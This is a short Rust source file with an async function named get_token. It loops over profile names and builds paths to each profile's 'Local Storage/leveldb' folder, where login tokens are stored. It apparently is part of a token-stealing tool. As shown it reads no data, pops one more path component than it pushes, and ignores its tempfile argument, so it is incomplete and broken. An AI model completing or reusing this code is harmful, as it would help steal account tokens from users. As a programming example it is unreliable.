use std::path::PathBuf;

pub async fn get_token(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
) -> std::io::Result<()> {
    for profile in profiles {
        path.push(profile);
        path.push("Local Storage/leveldb");

        path.pop();
        path.pop();
        path.pop();
    }
    Ok(())
}
